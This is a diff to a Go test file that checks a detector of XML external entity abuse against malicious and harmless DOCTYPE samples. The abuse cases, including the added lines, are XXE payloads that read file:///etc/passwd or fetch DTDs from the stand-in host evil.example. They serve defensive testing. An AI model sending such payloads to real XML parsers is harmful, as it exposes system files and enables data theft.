@@ -304,6 +304,9 @@ func TestXMLExternalEntityPatternBlocksAbuse(t *testing.T) {
 		"<!DOCTYPE svg [\n  <!ENTITY   xxe\tSYSTEM 'file:///etc/passwd'>\n]><svg/>",
 		`<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://evil.example/x.dtd"> %dtd;]><r/>`,
 		`<!doctype r [<!entity pub public "-//X//EN" "http://evil.example/p">]><r/>`,
+		// External DTD: the entities live in the fetched file instead.
+		`<?xml version="1.0"?><!DOCTYPE r SYSTEM "https://evil.example/x.dtd"><r>&e;</r>`,
+		`<!doctype data system 'file:///etc/passwd'><data/>`,
 	}
 	for _, s := range abuse {
 		in := model.MockInput{ResponseBody: s}
@@ -320,6 +323,8 @@ func TestXMLExternalEntityPatternAllowsLegitLookalikes(t *testing.T) {
 		`<!DOCTYPE note [<!ENTITY company "Acme Inc">]><note>&company;</note>`,
 		`<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html/>`,
 		`<?xml version="1.0"?><rss version="2.0"><channel><title>SYSTEM status</title></channel></rss>`,
+		`<!DOCTYPE html SYSTEM "about:legacy-compat"><html></html>`,
+		`<!DOCTYPE config SYSTEM "config.dtd"><config/>`,
 		`{"error": "ENTITY SYSTEM unavailable"}`,
 	}
 	for _, s := range legit {
